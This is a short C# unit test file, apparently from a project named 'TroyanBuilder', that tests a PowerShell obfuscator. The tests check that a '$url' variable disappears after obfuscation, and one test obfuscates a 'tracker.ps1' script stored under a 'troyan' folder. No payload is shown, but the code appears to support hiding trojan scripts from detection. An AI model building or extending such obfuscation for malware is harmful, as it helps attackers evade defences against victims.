using System.Threading.Tasks;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using TroyanBuilder;

namespace Tests;

[TestClass]
public class FluentAssertionsTest
{
    [TestMethod]
    public async Task IpTest()
    {
    }
    
    [TestMethod]
    public void OLbfuscate1()
    {
        var data = System.IO.File.ReadAllText(@"test1.txt");
        data = new PowerShellObfuscator().Obfuscate(data);
        Assert.IsFalse(data.Contains("$url"));
    }
    
    [TestMethod]
    public void OLbfuscate2()
    {
        var data = System.IO.File.ReadAllText(@"test2.txt");
        data = new PowerShellObfuscator().Obfuscate(data);
        Assert.IsFalse(data.Contains("$url"));
    }
    
    [TestMethod]
    public void OLbfuscateTest()
    {
        var data = System.IO.File.ReadAllText(@"C:\soft\hephaestus\troyan\troyanps\tracker.ps1");
        data = new PowerShellObfuscator().Obfuscate(data);
        System.IO.File.WriteAllText(@"C:\soft\hephaestus\troyan\_output\1.ps1",data);
    }
}